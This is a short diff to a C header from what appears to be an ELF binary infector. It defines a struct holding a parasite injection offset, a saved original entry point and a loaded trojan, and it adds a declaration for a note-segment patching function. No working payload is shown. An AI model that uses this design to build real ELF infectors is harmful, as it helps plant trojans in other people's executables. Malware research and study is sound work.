@@ -11,11 +11,12 @@ typedef struct infect {
         elf_off_t   target_offset;      /**< location to inject parasite */
         elf_off_t   o_entry;            /**< Original entry point must be saved before infecting */
     } lsb;
-    off_t           src_bin_size;       /**< trojan size in disk */
+    off_t           trojan_size;       /**< trojan size in disk */
     void           *trojan;             /**< ELF infection; heap allocated via fread() @see utils.c */
 } infect_t;
 
 infect_t *inf_load(elf_t *, FILE *, open_mode_t, long, struct mapped_file *);
 elf_off_t inf_scan_segment(infect_t *);
 bool inf_load_and_patch(infect_t *);
+bool inf_note_patch(infect_t *inf);
 #endif
